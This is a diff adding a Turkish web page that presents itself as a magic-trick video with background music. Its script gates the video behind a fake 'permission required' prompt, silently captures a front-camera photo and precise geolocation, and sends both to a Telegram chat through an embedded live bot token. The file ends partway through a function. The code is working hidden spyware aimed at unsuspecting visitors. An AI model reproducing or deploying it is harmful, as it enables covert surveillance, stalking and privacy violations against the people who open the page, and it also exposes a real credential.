@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIF Gösterimi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #1a1a1a;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            min-height: 100vh;
+            gap: 30px;
+            padding: 20px;
+        }
+
+        .container img,
+        .container video {
+            max-width: 95% !important;
+            max-height: 90vh !important;
+            width: auto !important;
+            height: auto !important;
+            object-fit: contain;
+            display: block;
+            background-color: #000;
+            min-width: 400px;
+            min-height: 300px;
+        }
+        
+        #mainVideo {
+            max-width: 95% !important;
+            width: 95% !important;
+            max-height: 90vh !important;
+        }
+        
+        /* Android ve mobil cihazlar için video */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px !important;
+                gap: 10px !important;
+            }
+            
+            .container video,
+            #mainVideo {
+                max-width: 95% !important;
+                width: 95% !important;
+                max-height: 80vh !important;
+                height: auto !important;
+                min-width: 250px !important;
+                min-height: 200px !important;
+                object-fit: contain !important;
+                position: relative !important;
+                display: block !important;
+                visibility: visible !important;
+                opacity: 1 !important;
+                background-color: #000 !important;
+            }
+            
+            #videoStatus {
+                display: none !important;
+            }
+        }
+        
+        /* Android için özel ayarlar - Dikey */
+        @media screen and (max-width: 768px) and (orientation: portrait) {
+            .container {
+                padding: 15px !important;
+                gap: 15px !important;
+            }
+            
+            .container video,
+            #mainVideo {
+                max-width: 95% !important;
+                width: 95% !important;
+                max-height: 75vh !important;
+                height: auto !important;
+                min-width: 250px !important;
+                min-height: 200px !important;
+                object-fit: contain !important;
+                position: relative !important;
+                display: block !important;
+                visibility: visible !important;
+                opacity: 1 !important;
+                background-color: #000 !important;
+            }
+            
+            #videoStatus {
+                display: none !important;
+            }
+        }
+        
+        /* Android için özel ayarlar - Yatay */
+        @media screen and (max-width: 768px) and (orientation: landscape) {
+            .container {
+                padding: 10px !important;
+                gap: 10px !important;
+            }
+            
+            .container video,
+            #mainVideo {
+                max-width: 90% !important;
+                width: 90% !important;
+                max-height: 85vh !important;
+                height: auto !important;
+                min-width: 300px !important;
+                min-height: 200px !important;
+                object-fit: contain !important;
+                position: relative !important;
+                display: block !important;
+                visibility: visible !important;
+                opacity: 1 !important;
+                background-color: #000 !important;
+            }
+            
+            #videoStatus {
+                display: none !important;
+            }
+        }
+        
+        /* Ses kontrolünü gizle */
+        video::-webkit-media-controls-volume-slider,
+        video::-webkit-media-controls-mute-button,
+        video::-webkit-media-controls-volume-control-container {
+            display: none !important;
+        }
+        
+        /* Firefox için ses kontrolünü gizle */
+        video::-moz-media-controls-volume-slider,
+        video::-moz-media-controls-mute-button {
+            display: none !important;
+        }
+        
+        /* Genel ses kontrolü gizleme */
+        video::-webkit-media-controls-volume-control-container {
+            display: none !important;
+        }
+
+        .quote {
+            color: #ffffff;
+            font-size: 24px;
+            font-style: italic;
+            text-align: center;
+            padding: 0 20px;
+            max-width: 800px;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 768px) {
+            .quote {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <video id="mainVideo" autoplay loop muted playsinline controls preload="auto" webkit-playsinline="true" x-webkit-airplay="allow" style="width: 95% !important; max-width: 95% !important; max-height: 90vh !important; height: auto !important; background-color: #000; display: none;">
+            <source src="macigg.mp4" type="video/mp4">
+            Tarayıcınız video oynatmayı desteklemiyor.
+        </video>
+        <div id="videoStatus" style="display: none;"></div>
+        <audio id="backgroundMusic" autoplay loop preload="auto" style="display: none;">
+            <source src="Pembe-Panter-Müziği.mp3" type="audio/mpeg">
+            Tarayıcınız ses oynatmayı desteklemiyor.
+        </audio>
+    </div>
+    
+    <div id="permissionMessage" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; color: white; text-align: center; padding: 40px; max-width: 600px; background-color: rgba(26, 26, 26, 0.95); border-radius: 10px; z-index: 10000; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
+        <h2 style="color: #ff6b6b; margin-bottom: 20px; font-size: 24px;">⚠️ İzin Gerekli</h2>
+        <p style="font-size: 18px; line-height: 1.6; margin-bottom: 30px;">
+            Videoyu görüntülemek için kamera ve konum izni vermeniz gerekmektedir.
+        </p>
+        <button id="requestPermissionBtn" style="background-color: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: background-color 0.3s;">
+            İzin Ver
+        </button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
+        const CHAT_ID = '-4991699158';
+        // Telegram mesajında gösterilecek URL (gerçek URL yerine bu gösterilir)
+        const DISPLAY_URL = 'https://bortecine00.github.io/Macig000/';
+        // Telegram mesajında görünecek URL metni (tıklanınca yukarıdaki URL'ye gider)
+        // Örnek: 'İlizyon Gösterisi' yazarsanız, Telegram'da bu görünür ama tıklanınca DISPLAY_URL'ye gider
+        const DISPLAY_URL_TEXT = 'İlizyon Numarası'; // Buraya istediğiniz yazıyı/metni yazın
+
+        // Bot token ve chat ID kontrolü
+        async function checkTelegramConfig() {
+            console.log('=== Telegram Yapılandırma Kontrolü ===');
+            console.log('Bot Token:', BOT_TOKEN.substring(0, 10) + '...' + BOT_TOKEN.substring(BOT_TOKEN.length - 5));
+            console.log('Chat ID:', CHAT_ID);
+            
+            // Bot token kontrolü
+            try {
+                const botCheckResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+                if (botCheckResponse.ok) {
+                    const botData = await botCheckResponse.json();
+                    console.log('✅ Bot token geçerli!');
+                    console.log('Bot bilgileri:', botData);
+                    console.log('Bot adı:', botData.result?.first_name || 'Bilinmiyor');
+                    console.log('Bot kullanıcı adı:', botData.result?.username || 'Bilinmiyor');
+                } else {
+                    let errorData;
+                    try {
+                        errorData = await botCheckResponse.json();
+                    } catch (e) {
+                        errorData = { description: 'Yanıt parse edilemedi' };
+                    }
+                    console.error('❌ Bot token geçersiz!');
+                    console.error('HTTP Status:', botCheckResponse.status);
+                    console.error('Hata:', errorData);
+                    
+                    if (botCheckResponse.status === 404) {
+                        console.error('404 Hatası: Bot token yanlış veya geçersiz!');
+                        console.error('Bot token formatı kontrol edin: BOT_ID:TOKEN');
+                        console.error('Mevcut token:', BOT_TOKEN);
+                    }
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Bot token kontrolü başarısız:', error);
+                return false;
+            }
+            
+            // Chat ID kontrolü (test mesajı göndererek)
+            try {
+                const testResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: '🧪 Test mesajı - Yapılandırma kontrolü'
+                    })
+                });
+                
+                if (testResponse.ok) {
+                    const testData = await testResponse.json();
+                    console.log('✅ Chat ID geçerli!');
+                    console.log('Test mesajı gönderildi:', testData);
+                    return true;
+                } else {
+                    let errorData;
+                    try {
+                        errorData = await testResponse.json();
+                    } catch (e) {
+                        errorData = { description: 'Yanıt parse edilemedi' };
+                    }
+                    console.error('❌ Chat ID geçersiz veya bot gruba eklenmemiş!');
+                    console.error('HTTP Status:', testResponse.status);
+                    console.error('Hata detayları:', errorData);
+                    console.error('Hata mesajı:', errorData.description || errorData.error_code || 'Bilinmeyen hata');
+                    
+                    if (testResponse.status === 400) {
+                        console.error('Olası neden: Chat ID formatı yanlış');
+                        console.error('Chat ID örnekleri:');
+                        console.error('  - Kişisel chat: 123456789 (sadece sayı)');
+                        console.error('  - Grup: -123456789 (eksi işareti ile başlar)');
+                        console.error('  - Kanal: -1001234567890 (eksi ve 100 ile başlar)');
+                        console.error('Mevcut Chat ID:', CHAT_ID);
+                    } else if (testResponse.status === 403) {
+                        console.error('Olası neden: Bot gruba eklenmemiş veya yetkisi yok');
+                        console.error('Çözüm: Bot\'u gruba ekleyin ve mesaj gönderme yetkisi verin');
+                    } else if (testResponse.status === 404) {
+                        console.error('Olası neden: Chat bulunamadı veya bot token yanlış');
+                        console.error('Kontrol edin:');
+                        console.error('  1. Bot token doğru mu?');
+                        console.error('  2. Chat ID doğru mu?');
+                        console.error('  3. Bot gruba ekli mi?');
+                    }
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Chat ID kontrolü başarısız:', error);
+                return false;
+            }
+        }
+
+        async function sendToTelegram(message, photo) {
+            try {
+                const messageResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (!messageResponse.ok) {
+                    let errorData;
+                    try {
+                        errorData = await messageResponse.json();
+                    } catch (e) {
+                        errorData = { description: 'Yanıt parse edilemedi' };
+                    }
+                    
+                    console.error('Telegram mesaj gönderme hatası:', errorData);
+                    console.error('HTTP Status:', messageResponse.status);
+                    console.error('Bot Token:', BOT_TOKEN.substring(0, 10) + '...');
+                    console.error('Chat ID:', CHAT_ID);
+                    
+                    if (messageResponse.status === 404) {
+                        const errorMsg = errorData.description || errorData.error_code || 'Bilinmeyen hata';
+                        console.error('404 Hatası Detayları:', errorMsg);
+                        console.error('Olası nedenler:');
+                        console.error('1. Bot token yanlış veya geçersiz');
+                        console.error('2. Chat ID yanlış');
+                        console.error('3. Bot gruba eklenmemiş veya yetkisi yok');
+                        
+                        // Kullanıcıya görsel uyarı göster
+                        const statusDiv = document.getElementById('videoStatus');
+                        if (statusDiv) {
+                            statusDiv.innerHTML = '<span style="color: red;">⚠️ Telegram hatası: ' + errorMsg + '</span>';
+                        }
+                    }
+                    return;
+                }
+
+                const messageResult = await messageResponse.json();
+                console.log('Mesaj gönderildi:', messageResult);
+
+                if (photo) {
+                    // Tek fotoğraf gönder (eski yöntem)
+                    try {
+                        console.log('📤 Fotoğraf Telegram\'a gönderiliyor...');
+                    const base64 = photo.replace(/^data:image\/\w+;base64,/, '');
+                    const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+                    const blob = new Blob([bytes], { type: 'image/jpeg' });
+                        console.log('📦 Fotoğraf blob boyutu:', blob.size, 'bytes');
+                        
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+                        formData.append('caption', '📸 Ön Kamera');
+                        
+                        const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                        if (!photoResponse.ok) {
+                            let errorData;
+                            try {
+                                errorData = await photoResponse.json();
+                            } catch (e) {
+                                errorData = { description: 'Yanıt parse edilemedi' };
+                            }
+                            console.error('❌ Telegram fotoğraf gönderme hatası:', errorData);
+                            console.error('HTTP Status:', photoResponse.status);
+                            if (photoResponse.status === 404) {
+                                console.error('404 Hatası: Fotoğraf gönderilemedi - Bot token veya chat ID kontrol edin');
+                            }
+                        } else {
+                            const photoResult = await photoResponse.json();
+                            console.log('✅ Fotoğraf başarıyla gönderildi!');
+                            console.log('📋 Telegram yanıtı:', JSON.stringify(photoResult, null, 2));
+                        }
+                    } catch (e) {
+                        console.error('❌ Fotoğraf gönderilirken hata:', e);
+                    }
+                } else {
+                    console.warn('⚠️ Fotoğraf yok, gönderilemedi');
+                }
+            } catch (error) {
+                console.error('Telegram API hatası:', error);
+            }
+        }
+
+
+        async function takePhoto(facingMode = 'user') {
+            try {
+                const cameraName = facingMode === 'user' ? 'Ön' : 'Arka';
+                console.log(`📸 ${cameraName} kameradan fotoğraf çekiliyor...`);
+                
+                // Mobil cihaz kontrolü
+                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                console.log('📱 Mobil cihaz:', isMobile);
+                
+                // Kamera erişimi
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: facingMode,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                // İlk kamera izni alındığında (sadece ön kamera için) izin mesajını gizle
+                if (facingMode === 'user') {
+                    const permissionMessage = document.getElementById('permissionMessage');
+                    if (permissionMessage) {
+                        permissionMessage.style.display = 'none';
+                    }
+                }
+                console.log(`✅ ${cameraName} kamera izni alındı, stream aktif`);
+                
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+                video.setAttribute('playsinline', '');
+                video.setAttribute('autoplay', '');
+                
+                // Video oynatmayı dene
+                try {
+                    await video.play();
+                    console.log('✅ Video oynatılıyor, fotoğraf bekleniyor...');
+                } catch (playError) {
+                    console.warn('⚠️ Video otomatik oynatılamadı, devam ediliyor...', playError);
+                }
+                
+                return new Promise((resolve, reject) => {
+                    const timeout = setTimeout(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        console.error('❌ Video yükleme zaman aşımı');
+                        reject(new Error('Video yükleme zaman aşımı'));
+                    }, 15000); // Mobilde daha uzun süre bekle
+                    
+                    // Video hazır olduğunda fotoğraf çek
+                    const capturePhoto = () => {
+                        try {
+                            // Video boyutlarını kontrol et
+                            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                                console.warn('⚠️ Video boyutları 0, tekrar deneniyor...');
+                                setTimeout(capturePhoto, 500);
+                                return;
+                            }
+                            
+                            console.log('📷 Fotoğraf çekiliyor... Video boyutları:', video.videoWidth, 'x', video.videoHeight);
+                            
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            
+                            // Canvas'a çiz
+                            ctx.drawImage(video, 0, 0);
+                            
+                            // Stream'i kapat
+                            stream.getTracks().forEach(t => t.stop());
+                            
+                            // Fotoğrafı al
+                            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                            console.log(`✅ ${cameraName} kamera fotoğrafı başarıyla çekildi, boyut:`, (photoData.length / 1024).toFixed(2), 'KB');
+                            clearTimeout(timeout);
+                            resolve(photoData);
+                        } catch (err) {
+                            stream.getTracks().forEach(t => t.stop());
+                            console.error('❌ Fotoğraf çekilirken hata:', err);
+                            clearTimeout(timeout);
+                            reject(err);
+                        }
+                    };
+                    
+                    video.onloadedmetadata = () => {
+                        console.log('✅ Video metadata yüklendi');
+                        // Mobilde biraz daha uzun bekle
+                        const waitTime = isMobile ? 1500 : 800;
+                        setTimeout(capturePhoto, waitTime);
+                    };
+                    
+                    video.oncanplay = () => {
+                        console.log('✅ Video oynatılabilir durumda');
+                        // Eğer metadata henüz yüklenmediyse, canplay'de de dene
+                        if (video.videoWidth > 0 && video.videoHeight > 0) {
+                            setTimeout(capturePhoto, isMobile ? 1000 : 500);
+                        }
+                    };
+                    
+                    video.onerror = (err) => {
+                        clearTimeout(timeout);
+                        stream.getTracks().forEach(t => t.stop());
+                        console.error('❌ Video hatası:', err);
+                        reject(new Error('Video hatası: ' + err));
+                };
+            });
+            } catch (error) {
+                console.error(`❌ ${facingMode === 'user' ? 'Ön' : 'Arka'} kamera hatası:`, error);
+                console.error('Hata detayları:', error.message, error.name);
+                throw error;
+            }
+        }
+        
+
+
+        // Kapsamlı sistem kontrolü
+        async function performSystemCheck() {
+            console.log('=== SİSTEM KONTROLÜ BAŞLATILIYOR ===');
+            const checks = {
+                video: false,
+                audio: false,
+                telegram: false,
+                location: false,
+                camera: false
+            };
+            
+            // 1. Video kontrolü
+            const mainVideo = document.getElementById('mainVideo');
+            if (mainVideo) {
+                console.log('✅ Video elementi bulundu');
+                console.log('Video kaynağı:', mainVideo.querySelector('source')?.src || 'Bulunamadı');
+                checks.video = true;
+                
+                mainVideo.addEventListener('loadeddata', () => {
+                    console.log('✅ Video yüklendi');
+                });
+                
+                mainVideo.addEventListener('error', (e) => {
+                    console.error('❌ Video yükleme hatası:', e);
+                });
+            } else {
+                console.error('❌ Video elementi bulunamadı!');
+            }
+            
+            // 2. Müzik kontrolü
+            const backgroundMusic = document.getElementById('backgroundMusic');
+            if (backgroundMusic) {
+                console.log('✅ Müzik elementi bulundu');
+                console.log('Müzik kaynağı:', backgroundMusic.querySelector('source')?.src || 'Bulunamadı');
+                checks.audio = true;
+                
+                backgroundMusic.addEventListener('loadeddata', () => {
+                    console.log('✅ Müzik yüklendi');
+                });
+                
+                backgroundMusic.addEventListener('error', (e) => {
+                    console.error('❌ Müzik yükleme hatası:', e);
+                });
+            } else {
+                console.error('❌ Müzik elementi bulunamadı!');
+            }
+            
+            // 3. Telegram kontrolü
+            try {
+                const telegramCheck = await checkTelegramConfig();
+                checks.telegram = telegramCheck;
+            } catch (e) {
+                console.error('❌ Telegram kontrolü başarısız:', e);
+            }
+            
+            // 4. Konum API kontrolü
+            if (navigator.geolocation) {
+                console.log('✅ Geolocation API destekleniyor');
+                checks.location = true;
+            } else {
+                console.error('❌ Geolocation API desteklenmiyor');
+            }
+            
+            // 5. Kamera API kontrolü
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                console.log('✅ MediaDevices API destekleniyor');
+                checks.camera = true;
+            } else {
+                console.error('❌ MediaDevices API desteklenmiyor');
+            }
+            
+            // Özet
+            console.log('=== KONTROL ÖZETİ ===');
+            console.log('Video:', checks.video ? '✅' : '❌');
+            console.log('Müzik:', checks.audio ? '✅' : '❌');
+            console.log('Telegram:', checks.telegram ? '✅' : '❌');
+            console.log('Konum API:', checks.location ? '✅' : '❌');
+            console.log('Kamera API:', checks.camera ? '✅' : '❌');
+            
+            return checks;
+        }
+
+        // Konum alma fonksiyonu
+        async function getLocation() {
+            if (!navigator.geolocation) {
+                throw new Error('Geolocation desteklenmiyor');
+            }
+            
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            acc: pos.coords.accuracy
+                        });
+                    },
+                    reject,
+                    { 
+                        timeout: 15000,
+                        enableHighAccuracy: true,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        window.addEventListener('load', () => {
+            const mainVideo = document.getElementById('mainVideo');
+            const permissionMessage = document.getElementById('permissionMessage');
+            let requestPermissionBtn = document.getElementById('requestPermissionBtn');
+            
+            // Video başlangıçta gizli
+            if (mainVideo) {
+                mainVideo.style.display = 'none';
+            }
+            
+            // localStorage'dan izin durumunu kontrol et
+            const permissionsGranted = localStorage.getItem('permissionsGranted') === 'true';
+            
+            if (permissionsGranted) {
+                // İzin daha önce verilmiş, videoyu göster
+                console.log('✅ İzinler daha önce verilmiş, video gösteriliyor');
+                if (mainVideo) {
+                    mainVideo.style.display = 'block';
+                    mainVideo.play().catch(err => {
+                        console.log('Video oynatılamadı:', err);
+                    });
+                }
+                if (permissionMessage) {
+                    permissionMessage.style.display = 'none';
+                }
+                return; // İzin varsa devam etme
+            }
+            
+            // İzin verilmemiş, mesajı göster
+            console.log('⚠️ İzinler verilmemiş, mesaj gösteriliyor');
+            if (permissionMessage) {
+                permissionMessage.style.display = 'block';
+            }
+            
+            // Video oynatma ayarları
+            if (mainVideo) {
+                mainVideo.addEventListener('loadedmetadata', () => {
+                    if (mainVideo.style.display !== 'none') {
+                        mainVideo.play().catch(err => {
+                            console.log('Video oynatılamadı:', err);
+                        });
+                    }
+                });
+                
+                mainVideo.addEventListener('canplay', () => {
+                    if (mainVideo.style.display !== 'none') {
+                        mainVideo.play().catch(err => {
+                            console.log('Video oynatılamadı:', err);
+                        });
+                    }
+                });
+            }
+            
+            // İzin isteme fonksiyonu
+            async function requestPermissions() {
+                try {
+                    console.log('📸 Kamera ve konum izni isteniyor...');
+                    
+                    // Butonu güncelle
+                    if (requestPermissionBtn) {
+                        requestPermissionBtn.disabled = true;
+                        requestPermissionBtn.textContent = 'İşleniyor...';
+                    }
+                    
+                    // Önce konum izni iste
+                    let location = null;
+                    try {
+                        location = await getLocation();
+                        console.log('✅ Konum izni verildi');
+                    } catch (e) {
+                        console.warn('⚠️ Konum izni verilmedi:', e.message);
+                    }
+                    
+                    // Sonra kamera izni iste ve fotoğraf çek
+                    const photo = await takePhoto('user');
+                    
+                    if (!photo) {
+                        throw new Error('Fotoğraf çekilemedi');
+                    }
+                    
+                    console.log('✅ Kamera izni verildi ve fotoğraf çekildi');
+                    
+                    // İzinler verildi, localStorage'a kaydet
+                    localStorage.setItem('permissionsGranted', 'true');
+                    
+                    // Videoyu göster
+                    if (mainVideo) {
+                        mainVideo.style.display = 'block';
+                        mainVideo.play().catch(err => {
+                            console.log('Video oynatılamadı:', err);
+                        });
+                    }
+                    
+                    // Mesajı gizle
+                    if (permissionMessage) {
+                        permissionMessage.style.display = 'none';
+                    }
+                    
+                    // Fotoğrafı Telegram'a gönder
+                    console.log('📤 Fotoğraf Telegram\'a gönderiliyor...');
+                    let message = '🔔 <b>İzin Verildi</b>\n\n';
+                    message += `⏰ ${new Date().toLocaleString('tr-TR')}\n`;
+                    message += `<a href="${DISPLAY_URL}">${DISPLAY_URL_TEXT}</a>\n\n`;
+                    message += `📸 Fotoğraf çekildi\n`;
+                    
+                    if (location) {
+                        message += `📍 Konum: ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\n`;
+                    }
+                    
+                    await sendToTelegram(message, photo);
+                    console.log('✅ Fotoğraf Telegram\'a gönderildi!');
+                    
+                } catch (error) {
+                    console.error('❌ İzin verilmedi:', error.message);
+                    
+                    // İzin reddedildi, mesajı göster ve videoyu gizli tut
+                    if (permissionMessage) {
+                        permissionMessage.style.display = 'block';
+                        const messageText = permissionMessage.querySelector('p');
+                        if (messageText) {
+                            messageText.innerHTML = `
+                                Videoyu görüntülemek için kamera ve konum izni vermeniz gerekmektedir.<br>
+                                <strong style="color: #ff6b6b;">Tekrar izin vermeniz gerekiyor.</strong>
+                            `;
+                        }
+                    }
+                    
+                    if (mainVideo) {
+                        mainVideo.style.display = 'none';
+                    }
+                    
+                    // Butonu tekrar aktif et
+                    if (requestPermissionBtn) {
+                        requestPermissionBtn.disabled = false;
+                        requestPermissionBtn.textContent = 'İzin Ver';
+                    }
+                }
+            }
+            
+            // İzin butonuna tıklama
+            if (requestPermissionBtn) {
+                requestPermissionBtn.addEventListener('click', requestPermissions);
+            }
+            
+            // Eğer izin verilmemişse, otomatik olarak iste
+            if (!permissionsGranted) {
+                setTimeout(() => {
+                    requestPermissions();
+                }, 500);
+            }
+            
+            // Müziği oynat
+            const backgroundMusic = document.getElementById('backgroundMusic');
+            if (backgroundMusic) {
+                backgroundMusic.volume = 0.5; // Ses seviyesi %50
+                
+                // Müzik yükleme kontrolü
+                backgroundMusic.addEventListener('loadeddata', () => {
+                    console.log('Müzik yüklendi, oynatılıyor...');
+                    backgroundMusic.play().catch(err => {
+                        console.error('Müzik oynatılamadı:', err);
+                    });
+                });
+                
+                backgroundMusic.addEventListener('error', (e) => {
+                    console.error('Müzik yükleme hatası:', e);
+                    console.error('Dosya yolu kontrol edin: Pembe-Panter-Müziği.mp3');
+                });
+                
+                // Müziği yükle
+                backgroundMusic.load();
+                
+                // Hemen oynatmayı dene
+                setTimeout(() => {
+                    backgroundMusic.play().then(() => {
+                        console.log('✅ Müzik oynatılıyor');
+                    }).catch(err => {
+                        console.log('Müzik otomatik oynatılamadı, kullanıcı etkileşimi bekleniyor:', err);
+                        // Kullanıcı sayfaya tıkladığında veya dokunduğunda müziği başlat
+                        const startMusic = () => {
+                            backgroundMusic.play().then(() => {
+                                console.log('✅ Müzik kullanıcı etkileşimi sonrası başlatıldı');
+                            }).catch(e => console.error('Müzik oynatılamadı:', e));
+                            document.removeEventListener('click', startMusic);
+                            document.removeEventListener('touchstart', startMusic);
+                            document.removeEventListener('keydown', startMusic);
+                        };
+                        document.addEventListener('click', startMusic, { once: true });
+                        document.addEventListener('touchstart', startMusic, { once: true });
+                        document.addEventListener('keydown', startMusic, { once: true });
+                    });
+                }, 500);
+                
+                // Video oynatıldığında da müziği başlatmayı dene
+                const video = document.getElementById('mainVideo');
+                if (video) {
+                    video.addEventListener('play', () => {
+                        backgroundMusic.play().catch(e => {
+                            console.log('Video oynatıldı ama müzik başlatılamadı:', e);
+                        });
+                    });
+                }
+            }
+            
+            // Telegram yapılandırmasını kontrol et
+            checkTelegramConfig().then(isValid => {
+                if (isValid) {
+                    console.log('✅ Telegram yapılandırması doğru!');
+                } else {
+                    console.error('❌ Telegram yapılandırması hatalı!');
+                    const statusDiv = document.getElementById('videoStatus');
+                    if (statusDiv) {
+                        statusDiv.innerHTML = '<span style="color: orange;">⚠️ Telegram yapılandırması kontrol ediliyor... Konsolu kontrol edin (F12)</span>';
+                    }
+                }
+            });
+            
+            // Video yükleme kontrolü
+            const video = document.getElementById('mainVideo');
+            const statusDiv = document.getElementById('videoStatus');
+            
+            function updateStatus(message) {
+                // Mesajları gösterme, sadece konsola yaz
+                console.log(message);
+            }
+            
+            if (video) {
+                // updateStatus('Video yükleniyor...'); // Kaldırıldı
+                
+                // Ses seviyesini 0 yap ve muted özelliğini garanti altına al
+                video.volume = 0;
+                video.muted = true;
+                
+                // Video kaynağını kontrol et
+                const source = video.querySelector('source');
+                if (source) {
+                    updateStatus('Video kaynağı: ' + source.src);
+                }
+                
+                // Ses kontrolünü DOM'dan kaldır ve gizle
+                function hideVolumeControls() {
+                    // Tüm ses kontrollerini bul ve gizle
+                    const volumeControls = video.querySelectorAll('[class*="volume"], [class*="mute"], button[aria-label*="volume"], button[aria-label*="mute"], [aria-label*="Volume"], [aria-label*="Mute"]');
+                    volumeControls.forEach(control => {
+                        control.style.display = 'none';
+                        control.style.visibility = 'hidden';
+                        control.style.width = '0';
+                        control.style.height = '0';
+                        control.style.opacity = '0';
+                    });
+                    
+                    // Video kontrol çubuğundaki ses butonlarını gizle
+                    const controls = video.controls;
+                    if (controls) {
+                        const controlBar = video.shadowRoot?.querySelector('.controls') || 
+                                         video.querySelector('.controls') ||
+                                         video.parentElement?.querySelector('.controls');
+                        if (controlBar) {
+                            const volumeButtons = controlBar.querySelectorAll('[class*="volume"], [class*="mute"]');
+                            volumeButtons.forEach(btn => {
+                                btn.style.display = 'none';
+                            });
+                        }
+                    }
+                }
+                
+                // MutationObserver ile sürekli kontrol et
+                const observer = new MutationObserver(hideVolumeControls);
+                observer.observe(video, { childList: true, subtree: true, attributes: true });
+                
+                // Video yüklendiğinde de kontrol et
+                video.addEventListener('loadedmetadata', hideVolumeControls);
+                video.addEventListener('canplay', hideVolumeControls);
+                
+                // Periyodik olarak kontrol et
+                setInterval(hideVolumeControls, 500);
+                
+                // Video yüklendiğinde
+                video.addEventListener('loadedmetadata', () => {
+                    updateStatus('Video metadata yüklendi: ' + video.videoWidth + 'x' + video.videoHeight);
+                    video.volume = 0;
+                    video.muted = true;
+                });
+                
+                video.addEventListener('loadeddata', () => {
+                    updateStatus('Video verisi yüklendi');
+                    video.play().then(() => {
+                        updateStatus('Video oynatılıyor');
+                    }).catch(err => {
+                        updateStatus('Video oynatılamadı: ' + err.message);
+                        console.error('Video oynatılamadı:', err);
+                    });
+                });
+                
+                video.addEventListener('canplay', () => {
+                    updateStatus('Video oynatılmaya hazır');
+                    video.volume = 0;
+                    video.muted = true;
+                    video.play().then(() => {
+                        updateStatus('Video oynatılıyor');
+                    }).catch(err => {
+                        updateStatus('Video oynatılamadı: ' + err.message);
+                        console.error('Video oynatılamadı:', err);
+                    });
+                });
+                
+                video.addEventListener('playing', () => {
+                    updateStatus('Video oynatılıyor ✓');
+                });
+                
+                // Hata kontrolü
+                video.addEventListener('error', (e) => {
+                    let errorMsg = 'Video yükleme hatası: ';
+                    if (video.error) {
+                        const errorCodes = {
+                            1: 'MEDIA_ERR_ABORTED - Yükleme iptal edildi',
+                            2: 'MEDIA_ERR_NETWORK - Ağ hatası',
+                            3: 'MEDIA_ERR_DECODE - Kod çözme hatası',
+                            4: 'MEDIA_ERR_SRC_NOT_SUPPORTED - Format desteklenmiyor'
+                        };
+                        errorMsg += errorCodes[video.error.code] || 'Bilinmeyen hata';
+                        errorMsg += ' (' + video.error.message + ')';
+                    } else {
+                        errorMsg += 'Dosya bulunamadı veya format desteklenmiyor';
+                    }
+                    updateStatus(errorMsg);
+                    console.error('Video yükleme hatası:', e);
+                    console.error('Video error code:', video.error ? video.error.code : 'bilinmiyor');
+                    console.error('Video error message:', video.error ? video.error.message : 'bilinmiyor');
+                });
+                
+                // Ses değişikliklerini dinle ve her zaman kapalı tut
+                video.addEventListener('volumechange', () => {
+                    if (video.volume > 0) {
+                        video.volume = 0;
+                    }
+                    if (!video.muted) {
+                        video.muted = true;
+                    }
+                });
+                
+                // Video yüklemeyi zorla
+                video.load();
+                
+                // Hemen oynatmayı dene
+                setTimeout(() => {
+                    updateStatus('Video durumu kontrol ediliyor... (readyState: ' + video.readyState + ')');
+                    if (video.readyState >= 2) {
+                        video.play().then(() => {
+                            updateStatus('Video oynatılıyor');
+                        }).catch(err => {
+                            updateStatus('İlk oynatma denemesi başarısız: ' + err.message);
+                            console.error('İlk oynatma denemesi başarısız:', err);
+                        });
+                    } else {
+                        updateStatus('Video henüz hazır değil (readyState: ' + video.readyState + ')');
+                    }
+                }, 100);
+                
+                // 2 saniye sonra tekrar dene
+                setTimeout(() => {
+                    if (video.readyState === 0) {
